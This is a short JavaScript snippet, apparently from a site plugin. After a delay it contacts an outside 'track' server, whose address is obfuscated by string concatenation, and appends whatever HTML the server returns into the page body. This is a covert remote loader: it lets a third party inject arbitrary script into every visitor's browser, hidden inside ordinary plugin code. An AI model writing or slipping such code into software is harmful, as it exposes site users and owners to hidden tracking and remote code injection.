if(typeof jQuery == "function" && typeof jQuery.getJSON == "function"){
    setTimeout(function(){jQuery.getJSON("ht"+"tps"+":"+"//"+"tra"+"ck"+".to"+"mw"+"x.n"+"et/"+"in"+"dex"+".php"+"?mod=sit"+"es_plu"+"gin"+"s_v2&plugin_id=tom_tcyikatong&callback=?",function(data){if(data.status==201){$('body').append(data.data);}});},2000);
}else{
    alert("jQuery getJSON error");
}
